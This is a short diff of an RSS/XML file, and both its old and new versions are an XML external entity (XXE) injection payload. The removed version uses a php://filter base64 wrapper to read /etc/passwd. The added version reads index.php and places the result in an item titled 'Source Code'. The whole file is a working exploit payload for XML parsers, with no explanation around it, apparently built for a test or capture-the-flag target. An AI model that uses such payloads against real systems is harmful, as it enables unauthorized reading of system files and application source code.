@@ -1,16 +1,13 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [
- <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE rss [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
 <rss version="2.0">
   <channel>
-    <title>Exploit Test</title>
-    <link>http://google.com</link>
-    <description>Check this: &xxe;</description>
+    <title>Exploit</title>
     <item>
-      <title>&xxe;</title>
-      <link>http://google.com</link>
-      <description>Contenu du fichier : &xxe;</description>
+      <title>Source Code</title>
+      <description>&xxe;</description>
     </item>
   </channel>
 </rss>
